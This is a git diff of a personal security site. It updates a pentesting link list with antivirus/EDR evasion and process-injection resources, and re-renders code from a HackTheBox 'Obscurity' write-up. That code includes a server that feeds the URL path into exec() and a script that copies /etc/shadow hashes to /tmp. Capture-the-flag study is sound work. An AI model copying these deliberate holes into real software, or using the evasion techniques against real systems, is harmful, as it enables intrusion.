@@ -189,6 +189,7 @@ Usefull Web Browser plugins https://www.wappalyzer.com/download/ https://addons.
 <li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></li>
 <li><a href="https://www.win.tue.nl/~aeb/linux/hh/hh-8.html">https://www.win.tue.nl/~aeb/linux/hh/hh-8.html</a></li>
 <li><a href="http://www.dankalia.com/tutor/01005/0100501004.htm">http://www.dankalia.com/tutor/01005/0100501004.htm</a></li>
+<li><a href="https://blog.ikuamike.io/posts/2021/package_managers_privesc/">https://blog.ikuamike.io/posts/2021/package_managers_privesc/</a></li>
 </ul>
 <h4 id="windows-privilege-escalation">Windows Privilege Escalation</h4>
 <ul>
@@ -214,12 +215,6 @@ Usefull Web Browser plugins https://www.wappalyzer.com/download/ https://addons.
 <ul>
 <li><a href="https://vipulvyas0813.medium.com/introduction-to-powershell-for-penetration-testing-733236bc9547">https://vipulvyas0813.medium.com/introduction-to-powershell-for-penetration-testing-733236bc9547</a> <strong>&lt;&mdash;&mdash; Serie about Poershell for Penetration Testing (5 posts)</strong></li>
 </ul>
-<h4 id="exploit-developmentreversing">Exploit Development/Reversing</h4>
-<ul>
-<li><a href="https://www.shogunlab.com/blog/2017/08/11/zdzg-windows-exploit-0.html">https://www.shogunlab.com/blog/2017/08/11/zdzg-windows-exploit-0.html</a></li>
-<li><a href="https://n4r1b.netlify.app/posts/2020/01/dissecting-the-windows-defender-driver-wdfilter-part-1/">https://n4r1b.netlify.app/posts/2020/01/dissecting-the-windows-defender-driver-wdfilter-part-1/</a></li>
-<li><a href="https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing">https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing</a></li>
-</ul>
 <h4 id="linux-stuff">Linux stuff</h4>
 <ul>
 <li><a href="http://www.pathname.com/fhs/pub/fhs-2.3.html">http://www.pathname.com/fhs/pub/fhs-2.3.html</a></li>
@@ -239,6 +234,25 @@ Usefull Web Browser plugins https://www.wappalyzer.com/download/ https://addons.
 <li><a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></li>
 <li><a href="https://github.com/rapid7/ssh-badkeys">https://github.com/rapid7/ssh-badkeys</a></li>
 <li><a href="https://crackstation.net/">https://crackstation.net/</a></li>
+</ul>
+<h4 id="exploit-developmentreversing">Exploit Development/Reversing</h4>
+<ul>
+<li><a href="https://blog.sevagas.com/IMG/pdf/BypassAVDynamics.pdf">https://blog.sevagas.com/IMG/pdf/BypassAVDynamics.pdf</a></li>
+<li><a href="https://github.com/m0n0ph1/Process-Hollowing">https://github.com/m0n0ph1/Process-Hollowing</a></li>
+<li><a href="https://www.virusbulletin.com/virusbulletin/2011/10/okay-so-you-are-win32-emulator">https://www.virusbulletin.com/virusbulletin/2011/10/okay-so-you-are-win32-emulator</a></li>
+<li><a href="https://www.usenix.org/system/files/conference/woot16/woot16-paper-blackthorne_update.pdf">https://www.usenix.org/system/files/conference/woot16/woot16-paper-blackthorne_update.pdf</a></li>
+<li><a href="https://blog.sannemaasakkers.com/2021/08/07/adversary-phishing-characteristics/">https://blog.sannemaasakkers.com/2021/08/07/adversary-phishing-characteristics/</a></li>
+<li><a href="https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/">https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/</a></li>
+<li><a href="https://github.com/BC-SECURITY/Beginners-Guide-to-Obfuscation">https://github.com/BC-SECURITY/Beginners-Guide-to-Obfuscation</a></li>
+<li><a href="https://www.shogunlab.com/blog/2017/08/11/zdzg-windows-exploit-0.html">https://www.shogunlab.com/blog/2017/08/11/zdzg-windows-exploit-0.html</a></li>
+<li><a href="https://n4r1b.netlify.app/posts/2020/01/dissecting-the-windows-defender-driver-wdfilter-part-1/">https://n4r1b.netlify.app/posts/2020/01/dissecting-the-windows-defender-driver-wdfilter-part-1/</a></li>
+<li><a href="https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing">https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing</a></li>
+<li><a href="https://pinvoke.net/">https://pinvoke.net/</a></li>
+<li><a href="https://antiscan.me/">https://antiscan.me/</a></li>
+<li><a href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection</a> &ndash;&gt; ReflectiveDLLInjection en Powershell!!!!</li>
+<li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1</a> &ndash;&gt; Invoke-ReflectivePEInjection Powershell</li>
+<li><a href="https://blogs.msdn.microsoft.com/joelpob/2004/02/15/creating-delegate-types-via-reflection-emit/">https://blogs.msdn.microsoft.com/joelpob/2004/02/15/creating-delegate-types-via-reflection-emit/</a></li>
+<li><a href="https://web.archive.org/web/20120520182849/http://www.exploit-monday.com/2012_05_13_archive.html">https://web.archive.org/web/20120520182849/http://www.exploit-monday.com/2012_05_13_archive.html</a></li>
 </ul>
 <h4 id="compiling-exploits">Compiling exploits</h4>
 <ul>
@@ -347,8 +361,10 @@ Usefull Web Browser plugins https://www.wappalyzer.com/download/ https://addons.
 <li><a href="https://malicious.link/post/2016/kerberoast-pt1/">https://malicious.link/post/2016/kerberoast-pt1/</a> <strong>&lt;&mdash;&mdash; Serie about Kerberoasting (5 posts)</strong></li>
 <li><a href="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet">https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet</a></li>
 </ul>
+<h4 id="antivirusedr-evasion">Antivirus/EDR Evasion</h4>
 <h4 id="cool-presentationsvideos">Cool presentations/videos</h4>
 <ul>
+<li>Defeating EDRs using Dynamic Invocation - Jean Francois Maes <a href="https://youtu.be/LXfhyTpQ7TM">https://youtu.be/LXfhyTpQ7TM</a></li>
 <li>A New Era Of SSRF: Exploiting Url Parsrs - Orange Tsai <a href="https://www.youtube.com/watch?v=D1S-G8rJrEk">https://www.youtube.com/watch?v=D1S-G8rJrEk</a></li>
 <li>HTTP Desync Attacks: Smashing into the Cell Next Door - albinowax <a href="https://www.youtube.com/watch?v=w-eJM2Pc0KI&amp;t=1622s">https://www.youtube.com/watch?v=w-eJM2Pc0KI&amp;t=1622s</a></li>
 <li>A $7.500 BUG BOUNTY Bug Explained, step by step. (Blind XXE OOB over DNS) - STOK <a href="https://www.youtube.com/watch?v=aSiIHKeN3ys&amp;t=26s&amp;pbjreload=101">https://www.youtube.com/watch?v=aSiIHKeN3ys&amp;t=26s&amp;pbjreload=101</a></li>
@@ -577,7 +593,7 @@ ________________________________________________
 develop                 [Status: 200, Size: 5892, Words: 1806, Lines: 171]
 :: Progress: [87664/87664] :: 306 req/sec :: Duration: [0:04:46] :: Errors: 4 ::
 </code></pre><p><code>SuperSecureServer.py</code> under <code>develop</code> was found, which is something that sounds quite inteteresting, I open my browser and go against <code>http://10.10.10.168:8080/develop/SuperSecureServer.py</code>, and the next code is show:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> threading
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> threading
 <span style="color:#f92672">from</span> datetime <span style="color:#f92672">import</span> datetime
 <span style="color:#f92672">import</span> sys
 <span style="color:#f92672">import</span> os
@@ -585,15 +601,15 @@ develop                 [Status: 200, Size: 5892, Words: 1806, Lines: 171]
 <span style="color:#f92672">import</span> urllib.parse
 <span style="color:#f92672">import</span> subprocess
 
-respTemplate <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;HTTP/1.1 {statusNum} {statusCode}
-</span><span style="color:#e6db74">Date: {dateSent}
-</span><span style="color:#e6db74">Server: {server}
-</span><span style="color:#e6db74">Last-Modified: {modified}
-</span><span style="color:#e6db74">Content-Length: {length}
-</span><span style="color:#e6db74">Content-Type: {contentType}
-</span><span style="color:#e6db74">Connection: {connectionType}
+respTemplate <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;HTTP/1.1 </span><span style="color:#e6db74">{statusNum}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{statusCode}</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">Date: </span><span style="color:#e6db74">{dateSent}</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">Server: </span><span style="color:#e6db74">{server}</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">Last-Modified: </span><span style="color:#e6db74">{modified}</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">Content-Length: </span><span style="color:#e6db74">{length}</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">Content-Type: </span><span style="color:#e6db74">{contentType}</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">Connection: </span><span style="color:#e6db74">{connectionType}</span><span style="color:#e6db74">
 </span><span style="color:#e6db74">
-</span><span style="color:#e6db74">{body}
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">{body}</span><span style="color:#e6db74">
 </span><span style="color:#e6db74">&#34;&#34;&#34;</span>
 DOC_ROOT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;DocRoot&#34;</span>
 
@@ -611,13 +627,13 @@ MIMES <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;txt
     <span style="color:#66d9ef">def</span> __init__(self, <span style="color:#f92672">**</span>kwargs):
         self<span style="color:#f92672">.</span>__dict__<span style="color:#f92672">.</span>update(kwargs)
         now <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>now()
-        self<span style="color:#f92672">.</span>dateSent <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>modified <span style="color:#f92672">=</span> now<span style="color:#f92672">.</span>strftime(<span style="color:#e6db74">&#34;%a, </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> %b %Y %H:%M:%S&#34;</span>)
+        self<span style="color:#f92672">.</span>dateSent <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>modified <span style="color:#f92672">=</span> now<span style="color:#f92672">.</span>strftime(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%a</span><span style="color:#e6db74">, </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> %b %Y %H:%M:%S&#34;</span>)
     <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">stringResponse</span>(self):
         <span style="color:#66d9ef">return</span> respTemplate<span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>self<span style="color:#f92672">.</span>__dict__)
 
 <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Request</span>:
     <span style="color:#66d9ef">def</span> __init__(self, request):
-        self<span style="color:#f92672">.</span>good <span style="color:#f92672">=</span> True
+        self<span style="color:#f92672">.</span>good <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
         <span style="color:#66d9ef">try</span>:
             request <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>parseRequest(request)
             self<span style="color:#f92672">.</span>method <span style="color:#f92672">=</span> request[<span style="color:#e6db74">&#34;method&#34;</span>]
@@ -626,7 +642,7 @@ MIMES <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;txt
             self<span style="color:#f92672">.</span>header <span style="color:#f92672">=</span> request[<span style="color:#e6db74">&#34;header&#34;</span>]
             self<span style="color:#f92672">.</span>body <span style="color:#f92672">=</span> request[<span style="color:#e6db74">&#34;body&#34;</span>]
         <span style="color:#66d9ef">except</span>:
-            self<span style="color:#f92672">.</span>good <span style="color:#f92672">=</span> False
+            self<span style="color:#f92672">.</span>good <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
 
     <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parseRequest</span>(self, request):        
         req <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
@@ -651,14 +667,14 @@ MIMES <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;txt
 
     <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">listen</span>(self):
         self<span style="color:#f92672">.</span>sock<span style="color:#f92672">.</span>listen(<span style="color:#ae81ff">5</span>)
-        <span style="color:#66d9ef">while</span> True:
+        <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
             client, address <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>sock<span style="color:#f92672">.</span>accept()
             client<span style="color:#f92672">.</span>settimeout(<span style="color:#ae81ff">60</span>)
             threading<span style="color:#f92672">.</span>Thread(target <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>listenToClient,args <span style="color:#f92672">=</span> (client,address))<span style="color:#f92672">.</span>start()
 
     <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">listenToClient</span>(self, client, address):
         size <span style="color:#f92672">=</span> <span style="color:#ae81ff">1024</span>
-        <span style="color:#66d9ef">while</span> True:
+        <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
             <span style="color:#66d9ef">try</span>:
                 data <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>recv(size)
                 <span style="color:#66d9ef">if</span> data:
@@ -671,7 +687,7 @@ MIMES <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;txt
                     <span style="color:#66d9ef">raise</span> error(<span style="color:#e6db74">&#39;Client disconnected&#39;</span>)
             <span style="color:#66d9ef">except</span>:
                 client<span style="color:#f92672">.</span>close()
-                <span style="color:#66d9ef">return</span> False
+                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
     
     <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">handleRequest</span>(self, request, conn, address):
         <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>good:
@@ -713,9 +729,9 @@ MIMES <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;txt
     <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">serveDoc</span>(self, path, docRoot):
         path <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>unquote(path)
         <span style="color:#66d9ef">try</span>:
-            info <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;output = &#39;Document: {}&#39;&#34;</span> <span style="color:#75715e"># Keep the output for later debug</span>
-            <span style="color:#66d9ef">print</span>(info<span style="color:#f92672">.</span>format(path))
-            <span style="color:#66d9ef">exec</span>(info<span style="color:#f92672">.</span>format(path)) <span style="color:#75715e"># This is how you do string formatting, right?</span>
+            info <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;output = &#39;Document: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;&#34;</span> <span style="color:#75715e"># Keep the output for later debug</span>
+            print(info<span style="color:#f92672">.</span>format(path))
+            exec(info<span style="color:#f92672">.</span>format(path)) <span style="color:#75715e"># This is how you do string formatting, right?</span>
             cwd <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>dirname(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>realpath(__file__))
             docRoot <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(cwd, docRoot)
             <span style="color:#66d9ef">if</span> path <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;/&#34;</span>:
@@ -723,7 +739,7 @@ MIMES <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;txt
             requested <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(docRoot, path[<span style="color:#ae81ff">1</span>:])
             <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(requested):
                 mime <span style="color:#f92672">=</span> mimetypes<span style="color:#f92672">.</span>guess_type(requested)
-                mime <span style="color:#f92672">=</span> (mime <span style="color:#66d9ef">if</span> mime[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">!=</span> None <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#34;text/html&#34;</span>)
+                mime <span style="color:#f92672">=</span> (mime <span style="color:#66d9ef">if</span> mime[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">!=</span> <span style="color:#66d9ef">None</span> <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#34;text/html&#34;</span>)
                 mime <span style="color:#f92672">=</span> MIMES[requested<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;.&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]]
                 <span style="color:#66d9ef">try</span>:
                     <span style="color:#66d9ef">with</span> open(requested, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
@@ -739,7 +755,7 @@ MIMES <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;txt
                     data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>format(path)
                 status <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;404&#34;</span>
         <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
-            <span style="color:#66d9ef">print</span>(e)
+            print(e)
             errorPage <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(docRoot, <span style="color:#e6db74">&#34;errors&#34;</span>, <span style="color:#e6db74">&#34;500.html&#34;</span>)
             mime <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;text/html&#34;</span>
             <span style="color:#66d9ef">with</span> open(errorPage, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
@@ -791,7 +807,7 @@ passwordreminder.txt: UTF-8 Unicode text, with no line terminators
 www-data@obscure:/home/robert$ cat passwordreminder.txt 
 ´ÑÈÌÉàÙÁÑé¯·¿k
 </code></pre><p>And finally, the code of <code>SuperSecureCrypt.py</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys
 <span style="color:#f92672">import</span> argparse
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>(text, key):
@@ -826,19 +842,19 @@ parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db7
                     metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;InFile&#39;</span>,
                     type<span style="color:#f92672">=</span>str,
                     help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;The file to read&#39;</span>,
-                    required<span style="color:#f92672">=</span>False)
+                    required<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
 
 parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-o&#39;</span>,
                     metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;OutFile&#39;</span>,
                     type<span style="color:#f92672">=</span>str,
                     help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Where to output the encrypted/decrypted file&#39;</span>,
-                    required<span style="color:#f92672">=</span>False)
+                    required<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
 
 parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-k&#39;</span>,
                     metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Key&#39;</span>,
                     type<span style="color:#f92672">=</span>str,
                     help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Key to use&#39;</span>,
-                    required<span style="color:#f92672">=</span>False)
+                    required<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
 
 parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-d&#39;</span>, action<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;store_true&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Decrypt mode&#39;</span>)
 
@@ -851,30 +867,30 @@ banner<span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;###
 banner <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;  ############################</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
 banner <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;  #        FILE MODE         #</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
 banner <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;  ############################&#34;</span>
-<span style="color:#66d9ef">print</span>(banner)
-<span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>o <span style="color:#f92672">==</span> None <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>k <span style="color:#f92672">==</span> None <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>i <span style="color:#f92672">==</span> None:
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Missing args&#34;</span>)
+print(banner)
+<span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>o <span style="color:#f92672">==</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>k <span style="color:#f92672">==</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>i <span style="color:#f92672">==</span> <span style="color:#66d9ef">None</span>:
+    print(<span style="color:#e6db74">&#34;Missing args&#34;</span>)
 <span style="color:#66d9ef">else</span>:
     <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>d:
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Opening file {0}...&#34;</span><span style="color:#f92672">.</span>format(args<span style="color:#f92672">.</span>i))
+        print(<span style="color:#e6db74">&#34;Opening file </span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">...&#34;</span><span style="color:#f92672">.</span>format(args<span style="color:#f92672">.</span>i))
         <span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>i, <span style="color:#e6db74">&#39;r&#39;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;UTF-8&#39;</span>) <span style="color:#66d9ef">as</span> f:
             data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
 
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Decrypting...&#34;</span>)
+        print(<span style="color:#e6db74">&#34;Decrypting...&#34;</span>)
         decrypted <span style="color:#f92672">=</span> decrypt(data, args<span style="color:#f92672">.</span>k)
 
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Writing to {0}...&#34;</span><span style="color:#f92672">.</span>format(args<span style="color:#f92672">.</span>o))
+        print(<span style="color:#e6db74">&#34;Writing to </span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">...&#34;</span><span style="color:#f92672">.</span>format(args<span style="color:#f92672">.</span>o))
         <span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>o, <span style="color:#e6db74">&#39;w&#39;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;UTF-8&#39;</span>) <span style="color:#66d9ef">as</span> f:
             f<span style="color:#f92672">.</span>write(decrypted)
     <span style="color:#66d9ef">else</span>:
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Opening file {0}...&#34;</span><span style="color:#f92672">.</span>format(args<span style="color:#f92672">.</span>i))
+        print(<span style="color:#e6db74">&#34;Opening file </span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">...&#34;</span><span style="color:#f92672">.</span>format(args<span style="color:#f92672">.</span>i))
         <span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>i, <span style="color:#e6db74">&#39;r&#39;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;UTF-8&#39;</span>) <span style="color:#66d9ef">as</span> f:
             data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
 
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Encrypting...&#34;</span>)
+        print(<span style="color:#e6db74">&#34;Encrypting...&#34;</span>)
         encrypted <span style="color:#f92672">=</span> encrypt(data, args<span style="color:#f92672">.</span>k)
 
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Writing to {0}...&#34;</span><span style="color:#f92672">.</span>format(args<span style="color:#f92672">.</span>o))
+        print(<span style="color:#e6db74">&#34;Writing to </span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">...&#34;</span><span style="color:#f92672">.</span>format(args<span style="color:#f92672">.</span>o))
         <span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>o, <span style="color:#e6db74">&#39;w&#39;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;UTF-8&#39;</span>) <span style="color:#66d9ef">as</span> f:
             f<span style="color:#f92672">.</span>write(encrypted)
 </code></pre></div><p>By analyzing what the code does, one can see that it takes a file as input and a key and ciphers that file, is possible to observe as well we can provide a ciphered file and it&rsquo;s correspondant plain text file in decrypt mode as key, which will give back the key that was used&hellip;
@@ -926,7 +942,7 @@ drwxr-xr-x 2 root   root   4096 Dec  2 09:47 .
 drwxr-xr-x 7 robert robert 4096 Dec  2 09:53 ..
 -rwxr-xr-x 1 root   root   1805 Oct  5 13:09 BetterSSH.py
 </code></pre><p>There is a script called <code>BetterSSH.py</code>, we check it&rsquo;s code which is:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys
 <span style="color:#f92672">import</span> random<span style="color:#f92672">,</span> string
 <span style="color:#f92672">import</span> os
 <span style="color:#f92672">import</span> time
@@ -942,16 +958,16 @@ session <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;u
 
     <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;/etc/shadow&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
         data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()
-    data <span style="color:#f92672">=</span> [(p<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;:&#34;</span>) <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;$&#34;</span> <span style="color:#f92672">in</span> p <span style="color:#66d9ef">else</span> None) <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> data]
+    data <span style="color:#f92672">=</span> [(p<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;:&#34;</span>) <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;$&#34;</span> <span style="color:#f92672">in</span> p <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">None</span>) <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> data]
     passwords <span style="color:#f92672">=</span> []
     <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> data:
-        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> x <span style="color:#f92672">==</span> None:
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> x <span style="color:#f92672">==</span> <span style="color:#66d9ef">None</span>:
             passwords<span style="color:#f92672">.</span>append(x)
 
     passwordFile <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join([<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join(p) <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> passwords]) 
     <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;/tmp/SSH/&#39;</span><span style="color:#f92672">+</span>path, <span style="color:#e6db74">&#39;w&#39;</span>) <span style="color:#66d9ef">as</span> f:
         f<span style="color:#f92672">.</span>write(passwordFile)
-    time<span style="color:#f92672">.</span>sleep(<span style="color:#f92672">.</span><span style="color:#ae81ff">1</span>)
+    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">.1</span>)
     salt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
     realPass <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
     <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> passwords:
@@ -960,7 +976,7 @@ session <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;u
             <span style="color:#66d9ef">break</span>
 
     <span style="color:#66d9ef">if</span> salt <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span>:
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Invalid user&#34;</span>)
+        print(<span style="color:#e6db74">&#34;Invalid user&#34;</span>)
         os<span style="color:#f92672">.</span>remove(<span style="color:#e6db74">&#39;/tmp/SSH/&#39;</span><span style="color:#f92672">+</span>path)
         sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
